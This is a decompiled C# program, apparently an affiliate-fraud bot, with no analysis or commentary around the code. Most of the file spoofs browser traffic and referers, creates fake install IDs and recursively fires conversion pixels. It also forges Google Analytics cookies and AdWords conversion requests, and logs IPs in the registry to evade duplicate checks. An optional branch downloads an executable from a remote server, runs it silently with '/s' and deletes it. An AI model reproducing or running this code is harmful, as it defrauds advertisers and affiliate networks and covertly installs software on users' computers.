using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using HTTPAgent;
using Microsoft.Win32;

namespace AffiliateExecuterNoWin;

internal static class Program
{
	private static string trackerUrlAndVersion;

	[STAThread]
	private static void Main(string[] args)
	{
		string text = "http://coolfbskins.info/getitnow";
		string appName = "hazidtacp";
		bool flag = false;
		string uRL = "http://whatismyipaddress.com/";
		bool flag2 = false;
		string text2 = "gamewrangler_v2.exe";
		string url = "http://ie-organic.conduit-download.com/77/295/CT2956077/Downloads/IE/Releases/6.3.5.3/11-04-20-11.19.22.106/" + text2;
		trackerUrlAndVersion = "http://www.google-analytics.com/__utm.gif?utmwv=4.9.2";
		DateTime dateTime = new DateTime(3000, 1, 1);
		if (dateTime < DateTime.Now)
		{
			return;
		}
		Agent agent = new Agent();
		agent.EmulateBrowser();
		string uRL2;
		if (flag)
		{
			uRL2 = agent.GetURL(uRL);
			string text3 = DataExtractor.ExtractDataArray(uRL2, "(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b)", "$1")[0];
			string savedIPs = GetSavedIPs(appName);
			if (savedIPs.IndexOf(text3) >= 0)
			{
				return;
			}
			SetSavedIPs(appName, savedIPs + text3 + ";");
		}
		if (!string.IsNullOrEmpty(text))
		{
			agent.Referer = text;
		}
		uRL2 = agent.GetURL("http://bsitm3.com/?a=18003&c=140&s1=");
		string uRL3 = DataExtractor.ExtractDataArray(uRL2, "window.location=\"([^\"]+)", "$1")[0];
		agent.GetURL(uRL3);
		uRL3 = agent.Referer;
		agent.GetURL("http://www.facetheme.com/setTheme.php?skinid=100087&redir=http%3A%2F%2Fwww.facetheme.com%2Fdownload%2F");
		agent.GetURL("http://app.adurr.com/fb/setTheme.php?skinid=100087&redir=http://www.facetheme.com/download/");
		agent.Referer = "";
		agent.GetURL("http://www.facetheme.com/install_redirect.php");
		string text4 = Guid.NewGuid().ToString().ToUpper();
		string text5 = text4;
		agent.GetURL("http://www.facetheme.com/exit_file.php?installid={" + text5 + "}&version=1.0.0");
		agent.GetURL("http://www.facetheme.com/installed/{" + text5 + "}/1.0.0/");
		agent.GetURL("http://www.facetheme.com/cpa_pixels/nvb.php?cid=us&pid=ft");
		agent.GetURL("http://pqsar.com/javascript/8001.js?action=12560");
		agent.Referer = "http://www.facetheme.com/cpa_pixels/nvb.php?cid=us&pid=ft";
		string uRL4 = agent.GetURL("http://www.tracklead.net/pixel.track?CID=144152&MerchantReferenceID=");
		GetRecursivePixels(agent, uRL4);
		agent.Referer = "http://www.facetheme.com/cpa_pixels/nvb.php?cid=us&pid=ft";
		agent.GetURL("http://pqsar.com/pixel/?o=8001&action=12560");
		if (!flag2)
		{
			return;
		}
		if (Directory.Exists("C:\\Users\\Public\\Documents\\"))
		{
			text2 = "C:\\Users\\Public\\Documents\\" + text2;
		}
		agent.getURL2File(url, text2);
		try
		{
			Process process = Process.Start(text2, "/s");
			process.WaitForExit();
			File.Delete(text2);
		}
		catch
		{
		}
	}

	private static void GetRecursivePixels(Agent agent, string html)
	{
		html = Regex.Replace(html, "<noscript>.*?</noscript>", "");
		List<string> list = new List<string>();
		list.AddRange(DataExtractor.ExtractDataArray(html, "pt src=\" ?([^\"]+)", "$1"));
		list.AddRange(DataExtractor.ExtractDataArray(html, "<SCRIPT language=\"javascript\" src=\" ?([^\"]+)", "$1"));
		list.AddRange(DataExtractor.ExtractDataArray(html, "<IMG src=\\\\?[\"'] ?([^\"'\\\\]+)", "$1"));
		list.AddRange(DataExtractor.ExtractDataArray(html, "<img src=\\\\?[\"'] ?([^\"'\\\\]+)", "$1"));
		list.AddRange(DataExtractor.ExtractDataArray(html, "<iframe[^>]+?src=[\"']([^\"'\\\\]+)", "$1"));
		string text = FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var google_conversion_id *= *([0-9]+)", "$1"));
		string text2 = "";
		string text3 = "";
		string text4 = "";
		string text5 = "";
		if (text != "")
		{
			text2 = FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var google_conversion_language\\s*=\\s*\"([^\"]+)", "$1"));
			text3 = FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var google_conversion_format\\s*=\\s*\"([^\"]+)", "$1"));
			text4 = FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var google_conversion_color\\s*=\\s*\"([^\"]+)", "$1"));
			text5 = FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var google_conversion_label\\s*=\\s*\"([^\"]+)", "$1"));
			list.Add(createGoogleAdServicesURL(text, text2, text3, text4, text5));
		}
		string text6 = FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var filitrac_offer_id\\s*=\\s*'([^']+)", "$1"));
		string referece = FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var filitrac_reference\\s*=\\s*'([^']+)", "$1"));
		if (text6 != "")
		{
			list.Add(createFilitracURL(text6, referece));
		}
		string referer = agent.Referer;
		foreach (string item in list)
		{
			agent.Referer = referer;
			string uRL = item.Trim().Replace("&amp;", "&");
			string uRL2 = agent.GetURL(uRL);
			GetRecursivePixels(agent, uRL2);
		}
	}

	private static string randomString(int len)
	{
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		Random random = new Random();
		string text2 = "";
		for (int i = 0; i < len; i++)
		{
			text2 += text[random.Next(text.Length)];
		}
		return text2;
	}

	private static string GetSavedIPs(string appName)
	{
		string result = ";";
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			currentUser = currentUser.OpenSubKey("SOFTWARE\\" + appName, writable: false);
			if (currentUser != null)
			{
				result = currentUser.GetValue("ips")!.ToString();
				return result;
			}
			return result;
		}
		catch
		{
			return result;
		}
	}

	private static void SetSavedIPs(string appName, string val)
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			currentUser = currentUser.OpenSubKey("SOFTWARE\\" + appName, writable: true);
			if (currentUser == null)
			{
				currentUser = Registry.CurrentUser.CreateSubKey("SOFTWARE\\" + appName);
			}
			currentUser.SetValue("ips", val);
		}
		catch
		{
		}
	}

	public static void addTrackingCookies(CookieContainer cookies, string domain)
	{
		Random random = new Random();
		Uri uri = new Uri("http://" + domain + "/");
		Uri uri2 = new Uri("http://utm.trk." + domain + "/");
		long num = (long)(DateTime.Now.ToUniversalTime() - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds;
		string text = uHash(domain);
		string value = text + "." + random.Next(int.MaxValue) + "." + num + "." + num + "." + num + ".1";
		string value2 = text + "." + num + ".1.1.utmcsr=ZJxdm025|utmccn=(not+set)|utmcmd=(not+set)";
		cookies.Add(uri, createCookie("__utma", value, 1800));
		cookies.Add(uri, createCookie("__utmb", text, 1800));
		cookies.Add(uri, createCookie("__utmc", text, 1800));
		cookies.Add(uri, createCookie("__utmz", value2, 1800));
		cookies.Add(uri2, createCookie("__utma", value, 1800));
		cookies.Add(uri2, createCookie("__utmb", text, 1800));
		cookies.Add(uri2, createCookie("__utmc", text, 1800));
		cookies.Add(uri2, createCookie("__utmz", value2, 1800));
	}

	private static void BugFix_CookieDomain(CookieContainer cookieContainer, string domain)
	{
		Type typeFromHandle = typeof(CookieContainer);
		Hashtable hashtable = (Hashtable)typeFromHandle.InvokeMember("m_domainTable", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.GetField, null, cookieContainer, new object[0]);
		ArrayList arrayList = new ArrayList(hashtable.Keys);
		foreach (string item in arrayList)
		{
			string text2 = item;
			if (text2 == domain)
			{
				string key = "." + text2;
				hashtable[key] = hashtable[item];
				hashtable.Remove(item);
			}
		}
	}

	public static string uHash(string d)
	{
		int num = 0;
		int num2 = 0;
		for (int num3 = d.Length - 1; num3 >= 0; num3--)
		{
			int num4 = char.Parse(d.Substring(num3, 1));
			num = ((num << 6) & 0xFFFFFFF) + num4 + (num4 << 14);
			if ((num2 = num & 0xFE00000) != 0)
			{
				num ^= num2 >> 21;
			}
		}
		return num.ToString();
	}

	public static Cookie createCookie(string name, string value, int timeout)
	{
		Cookie cookie = new Cookie(name, value);
		cookie.Expires = DateTime.Now.AddSeconds(timeout);
		return cookie;
	}

	public static string GetTrackingUrlByTemplate(Agent agent, string url, string trackingSearch, string trackingReplace, string domain)
	{
		string title = FirstOrEmpty(DataExtractor.ExtractDataArray(url, "&utmdt=([^&]*)", "$1"));
		string hostname = FirstOrEmpty(DataExtractor.ExtractDataArray(url, "&utmhn=([^&]*)", "$1"));
		string referer = FirstOrEmpty(DataExtractor.ExtractDataArray(url, "&utmr=([^&]*)", "$1"));
		string tracking = FirstOrEmpty(DataExtractor.ExtractDataArray(url, "&utmp=([^&]*)", "$1"));
		string utmac = FirstOrEmpty(DataExtractor.ExtractDataArray(url, "&utmac=([^&]*)", "$1"));
		bool addutmcn = ((!(FirstOrEmpty(DataExtractor.ExtractDataArray(url, "(&utmcn=1)", "$1")) == "")) ? true : false);
		string text = createTrackingUrl(title, hostname, referer, tracking, addutmcn, utmac, domain);
		if (!string.IsNullOrEmpty(trackingSearch) || !string.IsNullOrEmpty(trackingReplace))
		{
			text = text.Replace(trackingSearch, trackingReplace);
		}
		return agent.GetURL(text);
	}

	public static string FirstOrEmpty(string[] arr)
	{
		if (arr.Length > 0)
		{
			return arr[0];
		}
		return "";
	}

	public static string sGetTrackingUrl(Agent agent, string title, string hostname, string referer, string tracking, bool addutmcn)
	{
		return agent.GetURL(createTrackingUrl(title, hostname, referer, tracking, addutmcn, "", ""));
	}

	public static string createTrackingUrl(string title, string hostname, string referer, string tracking, bool addutmcn, string utmac, string domain)
	{
		Random random = new Random();
		string text = Screen.get_PrimaryScreen().get_Bounds().Width + "x" + Screen.get_PrimaryScreen().get_Bounds().Height;
		long num = (long)(DateTime.Now.ToUniversalTime() - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds;
		string text2 = uHash(domain);
		string text3 = text2 + "." + random.Next(int.MaxValue) + "." + num + "." + num + "." + num + ".1";
		string text4 = text2 + "." + num + ".1.1.utmcsr%3D(direct)%7Cutmccn%3D(direct)%7Cutmcmd%3D(none)%3B";
		string text5 = "__utma%3D" + text3 + "%3B%2B__utmz%3D" + text4;
		return trackerUrlAndVersion + "&utms=1&utmn=" + random.Next(int.MaxValue) + "&utmhn=" + hostname + "&utmcs=utf-8&utmsr=" + text + "&utmsc=32-bit&utmul=en-us&utmje=1&utmfl=10.2%20r159" + ((title == "") ? "" : ("&utmdt=" + title)) + "&utmhid=" + random.Next(int.MaxValue) + ((referer == "") ? "" : ("&utmr=" + referer)) + (addutmcn ? "&utmcn=1" : "") + "&utmp=" + tracking + "&utmac=" + utmac + "&utmcc=" + text5 + "&utmu=q~";
	}

	private static string createFilitracURL(string offerID, string referece)
	{
		return "http://www.filitrac.com/Lead.aspx?pid=" + offerID + "&ref=" + referece + "&iframe=1";
	}

	private static string createGoogleAdServicesURL(string cid, string clang, string cformat, string ccolor, string clabel)
	{
		long num = 1000L * (long)(DateTime.Now.ToUniversalTime() - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds + new Random().Next(1000);
		string[] array = clang.Split(new char[1] { '_' });
		string text = array[0];
		string text2 = ((array.Length <= 1) ? "" : array[1]);
		_ = DateTime.Now - DateTime.UtcNow;
		return "http://www.googleadservices.com/pagead/conversion/" + cid + "/?random=" + num + "&cv=6&fst=" + num + "&num=1&fmt=" + cformat + "&label=" + clabel + "&bg=" + ccolor + "&hl=" + text + "&gl=" + text2 + "&guid=ON&u_h=" + Screen.get_PrimaryScreen().get_Bounds().Height + "&u_w=" + Screen.get_PrimaryScreen().get_Bounds().Width + "&u_ah=" + (Screen.get_PrimaryScreen().get_Bounds().Height - 30) + "&u_aw=" + Screen.get_PrimaryScreen().get_Bounds().Width + "&u_cd=32&u_his=2&u_tz=" + (int)(DateTime.Now - DateTime.UtcNow).TotalMinutes + "&u_nplug=0&u_nmime=0&url=http%3A//www.zwinky.com/dl/successPixels.jhtml";
	}
}
